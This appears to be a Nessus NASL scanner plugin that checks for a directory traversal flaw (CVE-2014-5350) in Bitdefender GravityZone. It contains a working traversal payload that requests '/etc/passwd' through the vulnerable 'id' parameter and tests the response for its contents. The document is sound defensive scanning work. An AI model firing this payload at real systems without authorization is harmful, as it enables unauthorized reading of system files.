#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(76794);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2014-5350");
  script_bugtraq_id(68669);
  script_xref(name:"EDB-ID", value:"34086");

  script_name(english:"Bitdefender GravityZone < 5.1.11.432 Information Disclosure");
  script_summary(english:"Tries to download the contents of '/etc/passwd'.");

  script_set_attribute(attribute:"synopsis", value:
"An application hosted on the remote web server has a directory
traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Bitdefender GravityZone install hosted on the remote web server
has a directory traversal vulnerability. Input to the 'id' parameter
of the '/webservice/CORE/downloadFullKitEpc/a/1' script is not
properly sanitized.

A remote attacker could exploit this issue to download arbitrary
files, subject to the privileges under which the web server operates.

Note that this version is reportedly also affected by a missing
authentication vulnerability as well as a hard-coded credentials
issue; however, Nessus did not test for these additional issues.");
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140716-3_Bitdefender_GravityZone_Multiple_critical_vulnerabilities_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fc7fda14");
  script_set_attribute(attribute:"solution", value:"Upgrade to 5.1.11.432 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-5350");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/07/16");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/07/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:bitdefender:gravityzone");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("bitdefender_gravityzone_webui_detect.nbin");
  script_require_keys("installed_sw/Bitdefender GravityZone Web Interface");
  script_require_ports("Services/www", 443);

  exit(0);
}

include("http.inc");
include("install_func.inc");

app_name = "Bitdefender GravityZone Web Interface";
get_install_count(app_name:app_name, exit_if_zero:TRUE);

port = get_http_port(default:443);
install = get_single_install(app_name:app_name, port:port);
report_url = build_url(port:port, qs:install['path']);

# Try to access /etc/passwd
filename = '/etc/passwd';
payload = '/webservice/CORE/downloadFullKitEpc/a/1?id=../../../../..' + filename;
url = install['path'] + payload;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# If contents of /etc/passwd are not in response, then not affected.
if ("root:x:0:0:root" >!< res[2]) audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, report_url);

report = NULL;
attach_file = NULL;
output = NULL;
req = http_last_sent_request();
request = NULL;

if (report_verbosity > 0)
{
  report =
  '\n' + "Nessus was able to obtain the contents of '" + filename + "' with the" +
  '\n' + 'following request :' +
  '\n' +
  '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
  '\n' + chomp(req) +
  '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
  '\n';

  if (report_verbosity > 1)
  {
    output = data_protection::redact_etc_passwd(output:res[2]);
    attach_file = filename;
    request = make_list(req);
  }
}
security_report_v4(port:port, extra:report, severity:SECURITY_WARNING, request:request, file:attach_file, output:output);
